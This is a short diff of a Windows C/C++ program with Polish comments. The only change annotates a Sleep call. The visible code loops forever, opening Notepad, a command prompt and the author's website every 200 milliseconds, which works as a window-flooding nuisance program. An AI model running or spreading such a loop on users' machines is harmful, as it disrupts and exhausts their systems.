@@ -6,7 +6,7 @@ int main()
 {
     while (true)
     {
-        Sleep(200);
+        Sleep(200); //poczekanie 200 milisekónd
         ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie notatnika
         ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie wiersza polecenia
         ShellExecuteA(NULL, "open", "https://alesuperstrona.5v.pl", NULL, NULL, SW_SHOWDEFAULT); //otwarcie mojej strony
